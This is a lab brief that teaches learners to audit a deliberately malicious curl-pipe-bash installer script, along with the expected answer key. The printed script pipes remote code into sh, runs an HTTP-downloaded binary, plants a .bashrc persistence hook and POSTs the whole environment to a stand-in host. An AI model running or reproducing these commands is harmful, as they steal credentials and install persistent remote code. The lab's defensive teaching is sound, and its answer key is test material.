## BRIEF
`install.sh` is a "one-line installer" — the kind of script a project's
README tells you to run with `curl https://.../install.sh | bash`. This lab
is pure reading: you never run this script, not even fenced. Your job is to
read it the way you'd read any script before piping it into a shell, name
every red flag by line, and render a verdict. Real installers of this shape
have shipped supply-chain attacks; the habit of reading before running is
the actual defense, not any tool.

## GUIDED STEPS

1. Read the script top to bottom. Do not run it — there is nothing to run
   it through; this lab has no fence because nothing here is ever executed:

       cat install.sh

   ```sh
   #!/bin/sh
   # TEACHING SAMPLE — intentionally flawed
   # install.sh — "one-line installer" from https://get.example-cdn.test
   set -e
   BASE="https://get.example-cdn.test"
   INSTALL_DIR="${INSTALL_DIR:-/opt/acme}"

   curl -fsSL "$BASE/stage2.sh" | sh
   sudo mkdir -p "$INSTALL_DIR"

   curl -fsSL "http://mirror.example-cdn.test/acme-agent" -o /tmp/acme-agent
   chmod +x /tmp/acme-agent
   /tmp/acme-agent --enroll "$BASE"
   echo "$BASE/agent.sh | sh" >> "$HOME/.bashrc"
   curl -fsSL -X POST --data "$(env)" "https://telemetry.example-cdn.test/enroll"
   ```

2. Find red flag 1 — line 8. A *second* remote script gets piped straight
   into `sh`, chained from inside the first one. You never see this one's
   contents; whoever controls `get.example-cdn.test` today can change it to
   anything tomorrow, and you'd never know.

3. Find red flag 2 — line 9. `sudo` appears with no explanation and no
   prompt-context. A "harmless installer" just silently claimed root to
   create a directory it could have asked you to create yourself.

4. Find red flag 3 — line 11. The second download is **plain HTTP, not
   HTTPS** (`http://mirror.example-cdn.test`), and the result is executed
   two lines later (`chmod +x` then run). Anyone on the network path can
   swap that response for their own binary — no certificate to fake, no TLS
   to break, just an unencrypted download about to be run as a program.

5. Find red flag 4 — line 14. The script appends a line to
   `$HOME/.bashrc`, so its own `curl | sh` pattern re-runs *every time you
   open a new shell* — persistence, planted by an "installer."

6. Find red flag 5 — line 15. The last line POSTs `$(env)` — your entire
   environment, which on a real machine can hold API keys, tokens, and
   credentials in environment variables — to a remote endpoint. This is
   exfiltration, dressed up as "telemetry."

7. Render your verdict and cite every flag. Write `answers.txt`:

       verdict=unsafe
       flag1=remote-exec
       flag2=privilege
       flag3=http-binary
       flag4=persistence
       flag5=exfil
       safe_alternative=download to a file, read it, pin a version, then run

8. `lab check bash L4.2`
